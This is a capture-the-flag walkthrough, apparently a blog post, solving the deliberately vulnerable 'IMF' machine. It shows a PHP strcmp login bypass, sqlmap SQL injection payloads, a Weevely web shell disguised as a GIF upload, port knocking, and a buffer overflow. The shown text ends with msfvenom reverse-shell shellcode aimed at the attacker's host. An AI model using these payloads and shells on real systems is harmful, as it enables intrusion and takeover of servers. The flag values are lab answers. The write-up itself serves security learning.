<p>Only port 80 is open, so let&rsquo;s begin from there.</p>

<p><img class="center" src="/images/pentest/imf/home.png" title="&lsquo;homepage&rsquo; &lsquo;impossible mission force&rsquo;" ></p>

<p>So we learn that IMF stands for Impossible Mission Force and that it&rsquo;s a US intelligence agency. 3-letter agencies everywhere!</p>

<p><img class="center" src="/images/pentest/imf/projects.png" title="&lsquo;projects&rsquo; &lsquo;imf projects&rsquo;" ></p>

<p>The Projects page makes for a fun read and it also reveals that the site is using PHP.</p>

<p><img class="center" src="/images/pentest/imf/contact.png" title="&lsquo;contact&rsquo; &lsquo;imf contact&rsquo;" ></p>

<p>The contact page gives us some names and mail addresses:</p>

<ul>
<li>Roger S. Michaels &ndash; <a href="&#109;&#97;&#105;&#108;&#x74;&#x6f;&#x3a;&#x72;&#x6d;&#x69;&#x63;&#x68;&#x61;&#x65;&#x6c;&#115;&#64;&#x69;&#x6d;&#102;&#46;&#108;&#x6f;&#x63;&#97;&#108;">&#114;&#109;&#105;&#x63;&#104;&#97;&#x65;&#108;&#115;&#64;&#x69;&#x6d;&#x66;&#46;&#108;&#111;&#x63;&#x61;&#x6c;</a></li>
<li>Alexander B. Keith &ndash; <a href="&#109;&#x61;&#105;&#x6c;&#x74;&#111;&#x3a;&#x61;&#107;&#x65;&#105;&#116;&#x68;&#64;&#105;&#109;&#102;&#46;&#x6c;&#111;&#x63;&#x61;&#x6c;">&#97;&#107;&#x65;&#x69;&#116;&#104;&#64;&#x69;&#x6d;&#102;&#x2e;&#108;&#x6f;&#99;&#97;&#108;</a></li>
<li>Elizabeth R. Stone &ndash; <a href="&#109;&#x61;&#105;&#108;&#116;&#x6f;&#58;&#101;&#x73;&#116;&#x6f;&#110;&#x65;&#64;&#x69;&#109;&#102;&#x2e;&#x6c;&#111;&#x63;&#x61;&#x6c;">&#101;&#x73;&#x74;&#x6f;&#110;&#x65;&#x40;&#x69;&#x6d;&#102;&#x2e;&#x6c;&#111;&#99;&#x61;&#108;</a></li>
</ul>


<h1>Flag #1 &ndash; Read the source</h1>

<p>The first flag can be found as a HTML comment in the source of the contact.php page:</p>

<p>```</p>

<!-- flag1{YWxsdGhlZmlsZXM=} -->


<p>```</p>

<p>Decoding the base64 flag gives the hint <code>allthefiles</code>.</p>

<h1>Flag #2 &ndash; JS includes</h1>

<p>I interpreted the hint to mean bruteforce, but I tried with multiple tools and wordlists and didn&rsquo;t find anything. Going back through the HTML source, I noticed that several of the included Javascript files look like base64:</p>

<p>```</p>

<pre><code>    &lt;script src="js/ZmxhZzJ7YVcxbVl.js"&gt;&lt;/script&gt;
    &lt;script src="js/XUnRhVzVwYzNS.js"&gt;&lt;/script&gt;
    &lt;script src="js/eVlYUnZjZz09fQ==.min.js"&gt;&lt;/script&gt;
</code></pre>

<p>```</p>

<p>Putting them all together gives the string <em>ZmxhZzJ7YVcxbVlXUnRhVzVwYzNSeVlYUnZjZz09fQ==</em>, which yields the second flag when decoded: <em>flag2{aW1mYWRtaW5pc3RyYXRvcg==}</em>. This, in turn, gives the next hint: <code>imfadministrator</code></p>

<h1>Flag #3 &ndash; Exploiting PHP strcmp function</h1>

<p>With no other services available, everything revolves around the site. Using the above hint in the URL takes us to a hastily-made login page:</p>

<p><img class="center" src="/images/pentest/imf/login.jpg" title="&lsquo;login&rsquo; &lsquo;login&rsquo;" ></p>

<p>And in the source there&rsquo;s an interesting comment:</p>

<p>```</p>

<!-- I couldn't get the SQL working, so I hard-coded the password. It's still mad secure through. - Roger -->


<p>```</p>

<p>Ok, this added an interesting twist that exploits PHP functionality. Since the password is hardcoded, when attempting to log in we&rsquo;d expect a string comparison to be made between the user input and the hardcoded password value. This is done in PHP through the use of the <strong>strcmp()</strong> function:</p>

<p>strcmp(string1,string2)</p>

<p>This function returns:</p>

<p>```
0 &ndash; if the two strings are equal
&lt;0 &ndash; if string1 is less than string2</p>

<blockquote><p>0 &ndash; if string1 is greater than string2
```</p></blockquote>

<p>However, when reading through its <a href="https://secure.php.net/manual/en/function.strcmp.php">manual page</a>, there was a very interesting comment by chris at unix-ninja dot com:</p>

<p>```
strcmp() will return NULL on failure.</p>

<p>This has the side effect of equating to a match when using an equals comparison (==).
Instead, you may wish to test matches using the identical comparison (===), which should not catch a NULL return.</p>

<hr />

<h2>  Example</h2>

<p>$variable1 = array();
$ans === strcmp($variable1, $variable2);</p>

<p>This will stop $ans from returning a match;</p>

<p>Please use strcmp() carefully when comparing user input, as this may have potential security implications in your code.
```</p>

<p>If we build on this example, in case the login page was codded with an equals comparison, making the function fail may exhibit the same behavior as if the strings matched. And to do that, we&rsquo;ll have to compare the hardcoded string with something that is not a string, like an array in this example. I used Burp to intercept the POST request that looks like this:</p>

<p><code>
user=&lt;input&gt;&amp;pass=&lt;input&gt;
</code></p>

<p>For the user, I used Roger&rsquo;s username that we&rsquo;ve discovered earlier. And then passed the password as an array:</p>

<p><code>
user=rmichaels&amp;pass[]=fail
</code></p>

<p>And the login succeeded!</p>

<p><code>
flag3{Y29udGludWVUT2Ntcw==}
Welcome, rmichaels
IMF CMS
</code></p>

<p>The decoded flag says <code>continueTOcms</code>. And that IMF CMS is a link to <a href="http://192.168.145.130/imfadministrator/cms.php?pagename=home">http://192.168.145.130/imfadministrator/cms.php?pagename=home</a></p>

<h1>Flag #4 &ndash; SQLi</h1>

<p><img class="center" src="/images/pentest/imf/cms.jpg" title="&lsquo;imf cms&rsquo; &lsquo;imf cms&rsquo;" ></p>

<p>The Upload Report page is under construction. The Disavowed list is redacted:</p>

<p><img class="center" src="/images/pentest/imf/list.png" title="&lsquo;list&rsquo; &lsquo;list&rsquo;" ></p>

<p>In the URL, observe how the pages are constructed:</p>

<p><code>
cms.php?pagename=disavowlist
</code></p>

<p>I tried inserting a single quote in the pagename parameter and sure enough, a SQL error!</p>

<p><code>
 Warning: mysqli_fetch_row() expects parameter 1 to be mysqli_result, boolean given in /var/www/html/imfadministrator/cms.php on line 29
</code></p>

<p>Time for sqlmap!</p>

<p>```
sqlmap -u <a href="http://192.168.145.130/imfadministrator/cms.php?pagename=upload">http://192.168.145.130/imfadministrator/cms.php?pagename=upload</a> &mdash;cookie &ldquo;PHPSESSID=o5jl7cjuohite8ifu20fghfkq1&rdquo; &mdash;dbms=MySQL &mdash;dump-all</p>

<p>GET parameter &lsquo;pagename&rsquo; is vulnerable. Do you want to keep testing the others (if any)? [y/N] n</p>

<h2>sqlmap identified the following injection point(s) with a total of 51 HTTP(s) requests:</h2>

<p>Parameter: pagename (GET)</p>

<pre><code>Type: boolean-based blind
Title: AND boolean-based blind - WHERE or HAVING clause
Payload: pagename=upload' AND 8343=8343 AND 'viDd'='viDd

Type: error-based
Title: MySQL &gt;= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
Payload: pagename=upload' AND (SELECT 7643 FROM(SELECT COUNT(*),CONCAT(0x716a7a6271,(SELECT (ELT(7643=7643,1))),0x71766b7171,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND 'gVxy'='gVxy

Type: AND/OR time-based blind
Title: MySQL &gt;= 5.0.12 AND time-based blind
Payload: pagename=upload' AND SLEEP(5) AND 'UvGQ'='UvGQ
</code></pre>

<hr />

<p>[04:20:24] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu 16.04 or 16.10 (yakkety or xenial)
web application technology: Apache 2.4.18
back-end DBMS: MySQL >= 5.0
```</p>

<p>The output was huge, so here I left only the relevant part:</p>

<p><code>
Database: admin
Table: pages
[4 entries]
+----+----------------------+-----------------------------------------------------------------------------------------------------------------------------------------------------------------------+
| id | pagename             | pagedata                                                                                                                                                              |
+----+----------------------+-----------------------------------------------------------------------------------------------------------------------------------------------------------------------+
| 1  | upload               | Under Construction.                                                                                                                                                   |
| 2  | home                 | Welcome to the IMF Administration.                                                                                                                                    |
| 3  | tutorials-incomplete | Training classrooms available. &lt;br /&gt;&lt;img src="./images/whiteboard.jpg"&gt;&lt;br /&gt; Contact us for training.                                                               |
| 4  | disavowlist          | &lt;h1&gt;Disavowed List&lt;/h1&gt;&lt;img src="./images/redacted.jpg"&gt;&lt;br /&gt;&lt;ul&gt;&lt;li&gt;*********&lt;/li&gt;&lt;li&gt;****** ******&lt;/li&gt;&lt;li&gt;*******&lt;/li&gt;&lt;li&gt;**** ********&lt;/li&gt;&lt;/ul&gt;&lt;br /&gt;-Secretary |
+----+----------------------+-----------------------------------------------------------------------------------------------------------------------------------------------------------------------+
</code></p>

<p>The admin DB contains a table with the pages that we&rsquo;ve seen in the CMS, but it looks like there&rsquo;s an extra page we didn&rsquo;t know about! Let&rsquo;s see it!</p>

<p><img class="center" src="/images/pentest/imf/tutorials.png" title="&lsquo;tutorials&rsquo; &lsquo;tutorials&rsquo;" ></p>

<p>I used an online barcode reader for the QR code which revealed the flag: <em>flag4{dXBsb2Fkcjk0Mi5waHA=}</em>. And the next hint is <code>uploadr942.php</code></p>

<h1>Flag #5 &ndash; PHP shell upload</h1>

<p>Going to <a href="http://192.168.145.130/imfadministrator/uploadr942.php">http://192.168.145.130/imfadministrator/uploadr942.php</a> takes us to an upload form:</p>

<p><img class="center" src="/images/pentest/imf/upload.jpg" title="&lsquo;upload&rsquo; &lsquo;upload&rsquo;" ></p>

<p>Attempting to directly upload a PHP shell fails with an invalid file extension message. Then I tried a GIF downloaded from the internet, but another error, that the file is too large. So I just created a makeshift file with the GIF89 magic number and uploaded it with no problems. There was no mention of where ig might be located, but in the source code of the page now appeared a HTML comment:</p>

<p>```</p>

<!-- d8988628c59f -->


<p>```</p>

<p>I tried putting that in the URL with a GIF extension, but that was a no-go. So I fired up dirb to see if there are any other directories under imfadministrator:</p>

<p>```
root@kali:/usr/share/wordlists/dirb# dirb <a href="http://192.168.145.130/imfadministrator/">http://192.168.145.130/imfadministrator/</a> common.txt</p>

<p>&mdash;&mdash; Scanning URL: <a href="http://192.168.145.130/imfadministrator/">http://192.168.145.130/imfadministrator/</a> &mdash;&mdash;
==> DIRECTORY: <a href="http://192.168.145.130/imfadministrator/images/">http://192.168.145.130/imfadministrator/images/</a>               <br/>
+ <a href="http://192.168.145.130/imfadministrator/index.php">http://192.168.145.130/imfadministrator/index.php</a> (CODE:200|SIZE:337)      <br/>
==> DIRECTORY: <a href="http://192.168.145.130/imfadministrator/uploads/">http://192.168.145.130/imfadministrator/uploads/</a>      <br/>
```</p>

<p>Awesome, it found and uploads directory. This time I appended the previous name to this new path and it found my GIF file. So the next thing was to repeat the process of a previous challenge and try uploading a PHP shell disguised as a GIF image. But today I decided to experiment with a different type of shell.</p>

<h2>TTP breakdown &ndash; Weevely Weaponized web shell</h2>

<p>Homepage: <a href="https://github.com/epinna/weevely3">https://github.com/epinna/weevely3</a></p>

<p><strong>Description</strong></p>

<blockquote><p>Weevely is a web shell designed for post-exploitation purposes that can be extended over the
network at runtime.</p>

<p>Upload weevely PHP agent to a target web server to get remote shell access to it. It has more than
30 modules to assist administrative tasks, maintain access, provide situational awareness, elevate
privileges, and spread into the target network.</p>

<p>Features</p>

<p>   Shell access to the target</p>

<p>   SQL console pivoting on the target</p>

<p>   HTTP/HTTPS proxy to browse through the target</p>

<p>   Upload and download files</p>

<p>   Spawn reverse and direct TCP shells</p>

<p>   Audit remote target security</p>

<p>   Run Meterpreter payloads</p>

<p>   Port scan pivoting on target</p>

<p>   Mount the remote filesystem</p>

<p>   Bruteforce SQL accounts pivoting on the target</p>

<p>Agent</p>

<p>The agent is a small, polymorphic PHP script hardly detected by AV and the communication protocol
is obfuscated within HTTP requests.</p></blockquote>

<p>First, I installed Weevely on my machine by cloning its git repository and installing the requirements:</p>

<p>```
root@kali:/opt/weevely3# apt-get install g++ python2.7 python-pip libyaml-dev python-dev libncurses5-dev</p>

<p>root@kali:/opt/weevely3# pip install -r requirements.txt &mdash;upgrade
```</p>

<p>Then I ran the Weevely client:</p>

<p>```
root@kali:/opt/weevely3# ./weevely.py</p>

<p>[+] weevely 3.6.2
[!] Error: too few arguments</p>

<p>[+] Run terminal or command on the target</p>

<pre><code>weevely &lt;URL&gt; &lt;password&gt; [cmd]
</code></pre>

<p>[+] Recover an existing session</p>

<pre><code>weevely session &lt;path&gt; [cmd]
</code></pre>

<p>[+] Generate new agent</p>

<pre><code>weevely generate &lt;password&gt; &lt;path&gt;
</code></pre>

<p>```</p>

<p>We need to generate the agent that we&rsquo;ll actually upload to the target server:</p>

<p><code>
./weevely.py generate securepass harmless.php
Generated 'harmless.php' with password 'securepass' of 695 byte size.
</code></p>

<p>I appended the GIF magic number at the beginning and changed the extension to GIF and successfully uploaded the shell. Then I connected to it with the Weevely client:</p>

<p>```
./weevely.py <a href="http://192.168.145.130/imfadministrator/uploads/c2fff7999be7.gif">http://192.168.145.130/imfadministrator/uploads/c2fff7999be7.gif</a> securepass</p>

<p>[+] weevely 3.6.2</p>

<p>[+] Target: 192.168.145.130
[+] Session:    /root/.weevely/sessions/192.168.145.130/c2fff7999be7_0.session</p>

<p>[+] Browse the filesystem or execute commands starts the connection
[+] to the target. Type :help for more information.</p>

<p>weevely> :help</p>

<p> :audit_disablefunctionbypass  Bypass disable_function restrictions with mod_cgi and .htaccess.   <br/>
 :audit_phpconf                Audit PHP configuration.                                           <br/>
 :audit_suidsgid               Find files with SUID or SGID flags.                                <br/>
 :audit_filesystem             Audit the file system for weak permissions.                        <br/>
 :audit_etcpasswd              Read /etc/passwd with different techniques.                        <br/>
 :shell_php                    Execute PHP commands.                                              <br/>
 :shell_sh                     Execute shell commands.                                            <br/>
 :shell_su                     Execute commands with su.                                          <br/>
 :system_extensions            Collect PHP and webserver extension list.                          <br/>
 :system_info                  Collect system information.                                        <br/>
 :system_procs                 List running processes.                                            <br/>
 :backdoor_reversetcp          Execute a reverse TCP shell.                                       <br/>
 :backdoor_meterpreter         Start a meterpreter session.                                       <br/>
 :backdoor_tcp                 Spawn a shell on a TCP port.                                       <br/>
 :bruteforce_sql               Bruteforce SQL database.                                           <br/>
 :file_upload2web              Upload file automatically to a web folder and get corresponding URL.
 :file_upload                  Upload file to remote filesystem.                                  <br/>
 :file_read                    Read remote file from the remote filesystem.                       <br/>
 :file_cp                      Copy single file.                                                  <br/>
 :file_clearlog                Remove string from a file.                                         <br/>
 :file_gzip                    Compress or expand gzip files.                                     <br/>
 :file_tar                     Compress or expand tar archives.                                   <br/>
 :file_enum                    Check existence and permissions of a list of paths.                <br/>
 :file_ls                      List directory content.                                            <br/>
 :file_check                   Get attributes and permissions of a file.                          <br/>
 :file_find                    Find files with given names and attributes.                        <br/>
 :file_download                Download file from remote filesystem.                              <br/>
 :file_rm                      Remove remote file.                                                <br/>
 :file_touch                   Change file timestamp.                                             <br/>
 :file_cd                      Change current working directory.                                  <br/>
 :file_webdownload             Download an URL.                                                   <br/>
 :file_mount                   Mount remote filesystem using HTTPfs.                              <br/>
 :file_grep                    Print lines matching a pattern in multiple files.                  <br/>
 :file_zip                     Compress or expand zip files.                                      <br/>
 :file_bzip2                   Compress or expand bzip2 files.                                    <br/>
 :file_edit                    Edit remote file on a local editor.                                <br/>
 :sql_dump                     Multi dbms mysqldump replacement.                                  <br/>
 :sql_console                  Execute SQL query or run console.                                  <br/>
 :net_phpproxy                 Install PHP proxy on the target.                                   <br/>
 :net_curl                     Perform a curl-like HTTP request.                                  <br/>
 :net_mail                     Send mail.                                                         <br/>
 :net_proxy                    Run local proxy to pivot HTTP/HTTPS browsing through the target.   <br/>
 :net_ifconfig                 Get network interfaces addresses.                                  <br/>
 :net_scan                     TCP Port scan.</p>

<p>The system shell interpreter is not available in this session, use the
following command replacements to simulate a unrestricted shell.</p>

<p> touch                                      file_touch     <br/>
 whoami, hostname, pwd, uname               system_info    <br/>
 gzip, gunzip                               file_gzip      <br/>
 mail                                       net_mail       <br/>
 curl                                       net_curl       <br/>
 zip, unzip                                 file_zip       <br/>
 nmap                                       net_scan       <br/>
 cd                                         file_cd        <br/>
 rm                                         file_rm        <br/>
 ps                                         system_procs   <br/>
 cat                                        file_read      <br/>
 ifconfig                                   shell_su       <br/>
 vi, vim, emacs, nano, pico, gedit, kwrite  file_edit      <br/>
 wget                                       file_webdownload
 find                                       file_find      <br/>
 tar                                        file_tar       <br/>
 ifconfig                                   net_ifconfig   <br/>
 bzip2, bunzip2                             file_bzip2     <br/>
 ls, dir                                    file_ls        <br/>
 cp, copy                                   file_cp        <br/>
 grep                                       file_grep<br/>
```</p>

<p>Now let&rsquo;s use it to poke around:</p>

<p><code>
weevely&gt; whoami
www-data
www-data@imf:/var/www/html/imfadministrator/uploads $ :system_info
+--------------------+-------------------------------------------------------------------------------+
| client_ip          | 192.168.145.129                                                               |
| max_execution_time | 30                                                                            |
| script             | /imfadministrator/uploads/c2fff7999be7.gif                                    |
| open_basedir       |                                                                               |
| hostname           | imf                                                                           |
| php_self           | /imfadministrator/uploads/c2fff7999be7.gif                                    |
| script_folder      | /var/www/html/imfadministrator/uploads                                        |
| uname              | Linux imf 4.4.0-45-generic #66-Ubuntu SMP Wed Oct 19 14:12:37 UTC 2016 x86_64 |
| pwd                | /var/www/html/imfadministrator/uploads                                        |
| safe_mode          | False                                                                         |
| php_version        | 7.0.32-0ubuntu0.16.04.1                                                       |
| dir_sep            | /                                                                             |
| os                 | Linux                                                                         |
| whoami             | www-data                                                                      |
| document_root      | /var/www/html                                                                 |
+--------------------+-------------------------------------------------------------------------------+
</code></p>

<p>Listing the files in the current directory gives us the fifth flag!</p>

<p>```
www-data@imf:/var/www/html/imfadministrator/uploads $ ls -alh
total 28K
drwxr-xr-x 2 www-data www-data 4.0K Oct  7 07:29 .
drwxr-xr-x 4 www-data www-data 4.0K Oct 17  2016 ..
-rw-r&mdash;r&mdash; 1 www-data www-data   82 Oct 12  2016 .htaccess
-rw-r&mdash;r&mdash; 1 www-data www-data  701 Oct  7 07:29 c2fff7999be7.gif
-rw-r&mdash;r&mdash; 1 www-data www-data   30 Oct  7 07:03 c72ad31b04e6.gif
-rw-r&mdash;r&mdash; 1 www-data www-data   30 Oct  7 06:47 d8988628c59f.gif
-rw-r&mdash;r&mdash; 1 www-data www-data   28 Oct 12  2016 flag5_abc123def.txt</p>

<p>$ cat flag5_abc123def.txt
flag5{YWdlbnRzZXJ2aWNlcw==}
```</p>

<p>The decoded hint is <code>agentservices</code></p>

<h1>Flag #6 &ndash; Binary exploitation</h1>

<p>I ran a search on the filesystem for files with agent in their name and got 2 hits:</p>

<p><code>
find / -type f -name agent*
/usr/local/bin/agent
/etc/xinetd.d/agent
</code></p>

<p>Interestingly, it seems there is an agent server around:</p>

<p>```
cat /etc/xinetd.d/agent</p>

<h1>default: on</h1>

<h1>description: The agent server serves agent sessions</h1>

<h1>unencrypted agentid for authentication.</h1>

<p>service agent
{</p>

<pre><code>   flags          = REUSE
   socket_type    = stream
   wait           = no
   user           = root
   server         = /usr/local/bin/agent
   log_on_failure += USERID
   disable        = no
   port           = 7788
</code></pre>

<p>}
```</p>

<p>So it seems the agent service is listening on port 7788 and running as root:</p>

<p><code>
netstat -lnt
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State      
tcp        0      0 0.0.0.0:7788            0.0.0.0:*               LISTEN  
</code></p>

<p>Next I went to <code>/usr/local/bin</code> where the executable is located:</p>

<p>```
./agent</p>

<hr />

<p> |<em> </em>|  \/  | <strong>|  Agent
  | || |\/| | <em>|   Reporting
 |</em></strong>|<em>|  |</em>|_|    System</p>

<p>Agent ID :
```</p>

<p>We need to give it a valid agent ID for authentication. Inside the folder there is also another file:</p>

<p><code>
www-data@imf:/usr/local/bin $ cat access_codes
SYN 7482,8279,9467
</code></p>

<p>Looks like a port knocking sequence. I borrowed from an example on <a href="https://wiki.archlinux.org/index.php/Port_knocking">ArchLinux wiki</a></p>

<p><code>
for port in 7482 8279 9467; do nmap -Pn --host-timeout 100 --max-retries 0 -p $port 192.168.145.130; done
</code></p>

<p>And when I ran Nmap again, I found port 7788 is now open to the public:</p>

<p><code>
PORT     STATE SERVICE
7788/tcp open  unknown
</code></p>

<p>Connecting to it takes us to the agent prompt where we have to put the agent ID. I downloaded the agent executable on my system for GDB:</p>

<p><code>
www-data@imf:/usr/local/bin $ :file_download agent /root/agent
</code></p>

<p>Running strings on it also gives some interesting infomation about extraction points. Anyway, back to the agent ID. In the strings I saw a call to <strong>strncmp</strong>, so when running the executable I set up a breakpoint on main, then ran the program, set a breakpoint to strncmp and gave it some input. Doing so, I noticed what appears to be a hardcoded value in the comparison:</p>

<p><code>
0000| 0xffffd32c --&gt; 0x80486bf (&lt;main+196&gt;: add    esp,0x10)
0004| 0xffffd330 --&gt; 0xffffd34e ("1234\n")
0008| 0xffffd334 --&gt; 0x804c1d0 ("48093572")
0012| 0xffffd338 --&gt; 0x8
0016| 0xffffd33c --&gt; 0xf7de4e6b (add    esp,0x10)
0020| 0xffffd340 --&gt; 0xf7f8a3fc --&gt; 0xf7f8b200 --&gt; 0x0
0024| 0xffffd344 --&gt; 0x0
0028| 0xffffd348 --&gt; 0x804c1d0 ("48093572")
</code></p>

<p>I used 48093572 as the agent ID and it worked and took me to a menu:</p>

<p>```
nc -vn 192.168.145.130 7788
(UNKNOWN) [192.168.145.130] 7788 (?) open</p>

<hr />

<p> |<em> </em>|  \/  | <strong>|  Agent
  | || |\/| | <em>|   Reporting
 |</em></strong>|<em>|  |</em>|_|    System</p>

<p>Agent ID : 48093572
Login Validated
Main Menu:
1. Extraction Points
2. Request Extraction
3. Submit Report
0. Exit
Enter selection: 1</p>

<p>Extraction Points:
Staatsoper, Vienna, Austria
Blenheim Palace, Woodstock, Oxfordshire, England, UK
Great Windmill Street, Soho, London, England, UK
Fawley Power Station, Southampton, England, UK
Underground Station U4 Schottenring, Vienna, Austria
Old Town Square, Old Town, Prague, Czech Republic
Drake Hotel &ndash; 140 E. Walton Pl., Near North Side, Chicago, Illinois, USA
Ashton Park, Mosman, Sydney, New South Wales, Australia
Argyle Place, The Rocks, Sydney, New South Wales, Australia</p>

<p>Enter selection: 2</p>

<p>Extraction Request
Enter extraction location: Vienna</p>

<p>Location: Vienna</p>

<p>Extraction team has been deployed.</p>

<p>Enter selection: 3</p>

<p>Enter report update: Abort extraction
Report: Abort extraction
Submitted for review.
```</p>

<p>Interesting. The 3rd option is the one that appears to take a variable amount of input, so maybe there&rsquo;s a buffer overflow lurking around. It&rsquo;s been a while since I&rsquo;ve done any binary exploitation. First thing, creating the pattern that might crash the service:</p>

<p><code>
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 1000
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2B
</code></p>

<p>I used the above string for the report and the program did crash:</p>

<p>```
Program received signal SIGSEGV, Segmentation fault.</p>

<p>[&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;registers&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&ndash;]
EAX: 0xffffd294 (&ldquo;Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af\224\322\377\377Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag&rdquo;&hellip;)
EBX: 0x0
ECX: 0xf7f8adc7 &mdash;> 0xf8b8900a
EDX: 0xf7f8b890 &mdash;> 0x0
ESI: 0xf7f8a000 &mdash;> 0x1d5d8c
EDI: 0x0
EBP: 0x35664134 (&lsquo;4Af5&rsquo;)
ESP: 0xffffd340 (&ldquo;f7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3&rdquo;&hellip;)
EIP: 0x41366641 (&lsquo;Af6A&rsquo;)
EFLAGS: 0x10286 (carry PARITY adjust zero SIGN trap INTERRUPT direction overflow)
[&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;-code&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&ndash;]
Invalid $PC address: 0x41366641
```</p>

<p>With my binary exploitation skills unused in a long time, I had to revisit some topics and also take a look at how others solved this. Moving on, a couple of interesting things, EIP gets overwritten by Af6A, which appears at offset 168 of the payload:</p>

<p><code>
./pattern_offset.rb -q Af6A -l 1000
[*] Exact match at offset 168
</code></p>

<p>However, if we look at EAX, we see our pattern from the beginning. Which means that if we had some shellcode instead of the pattern, it would get stored in EAX, and to execute it we would need a JMP or a CALL instruction to EAX. Luckily, there&rsquo;s one available!</p>

<p><code>
gdb-peda$ jmpcall eax
0x8048563 : call eax
</code></p>

<p>Now, for the shellcode part. The way of feeding it to the vulnerable program will be using a Python script. I chose a reverse TCP shell for the payload and avoided badchars like nulls and newlines (line feeds and carriage returns):</p>

<p><code>
msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.145.129 LPORT=8888 -f python -o killagent.py -b "\x00\x0a\x0d"
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x86 from the payload
Found 10 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 95 (iteration=0)
x86/shikata_ga_nai chosen with final size 95
Payload size: 95 bytes
Final size of python file: 470 bytes
Saved as: killagent.py
</code></p>

<p>The payload size is 95 bytes:</p>

<p><code>
cat killagent.py
buf =  ""
buf += "\xbb\x6e\x01\x4b\xcb\xdb\xcc\xd9\x74\x24\xf4\x5e\x31"
buf += "\xc9\xb1\x12\x31\x5e\x12\x03\x5e\x12\x83\xa8\x05\xa9"
buf += "\x3e\x05\xdd\xda\x22\x36\xa2\x77\xcf\xba\xad\x99\xbf"
buf += "\xdc\x60\xd9\x53\x79\xcb\xe5\x9e\xf9\x62\x63\xd8\x91"
buf += "\xb4\x3b\x8b\xe0\x5d\x3e\xac\xc0\x25\xb7\x4d\xb4\x30"
buf += "\x98\xdc\xe7\x0f\x1b\x56\xe6\xbd\x9c\x3a\x80\x53\xb2"
buf += "\xc9\x38\xc4\xe3\x02\xda\x7d\x75\xbf\x48\x2d\x0c\xa1"
buf += "\xdc\xda\xc3\xa2"
</code></p>

<p>Under these conditions, we would need to send a buffer of the shellcode + padding + the address of the CALL EAX instruction. Let&rsquo;s see the Python:</p>

